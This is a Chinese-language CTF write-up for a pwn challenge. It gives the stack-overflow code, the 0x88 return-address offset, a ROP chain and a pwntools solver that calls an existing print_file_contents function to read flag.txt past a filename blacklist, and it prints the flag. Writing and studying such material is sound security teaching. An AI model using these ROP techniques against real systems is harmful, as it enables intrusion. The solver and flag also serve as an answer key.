# r/WholesomeCopypasta

## 题目简述

程序把最多 0x100 字节读入 100 字节栈缓冲区，存在返回地址覆盖。正常路径会阻止包含 `flag` 或目录分隔符的文件名，但二进制中已有 `print_file_contents` 函数及 `flag.txt` 字符串。目标是用 ROP 绕过输入黑名单并调用现成函数读取 flag。

## 解题过程

漏洞为：

```c
char filename[100];
size_t end = read(0, filename, 0x100);
```

调试确认从 `filename` 到保存返回地址的偏移为 `0x88`。程序不是 PIE，可直接使用二进制中的 gadget、字符串和函数地址。调用约定要求第一个参数放在 `RDI`，因此 ROP 链为：

```text
ret                         # 必要时对齐栈
pop rdi ; ret
address_of("flag.txt")
print_file_contents
```

官方 solver 直接利用 `copypastas` 区域中的 `flag.txt` 字符串：

```python
rop = ROP(elf)
rop.call(rop.ret)
rop.print_file_contents(next(elf.search(b"flag.txt\x00")))

payload = b"bob.txt\x00"
payload += b"A" * (0x88 - len(payload))
payload += rop.chain()
```

开头使用合法文件名使黑名单检查正常通过；函数返回时才执行 ROP，故不需要在输入字符串中出现 `flag`。输出为：

```text
grey{r0p3d_1n_th3_flag!}
```

## 方法总结

输入黑名单只约束正常数据流，不能防止控制流劫持。ret2func/ROP 的核心是找出偏移、准备调用约定参数，并复用二进制已有代码与静态字符串；x86-64 下还要留意 16 字节栈对齐。
